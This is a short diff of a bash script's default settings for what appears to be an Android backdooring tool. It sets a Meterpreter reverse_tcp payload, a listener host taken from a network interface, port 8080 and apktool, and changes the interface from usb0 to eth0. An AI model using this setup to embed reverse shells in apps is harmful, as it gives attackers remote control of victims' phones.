@@ -9,7 +9,7 @@ GGreen=$'\e[1;32m'
 
 ### Input argument variables // setting default values ###
 PAYLOAD="android/meterpreter/reverse_tcp"
-LHOST=$(ifconfig usb0 | grep 'inet' | cut -d: -f2 | awk '{print $2}')
+LHOST=$(ifconfig eth0 | grep 'inet' | cut -d: -f2 | awk '{print $2}')
 LPORT="8080"
 VERBOSE=0
 APKTOOL="apktool.jar"
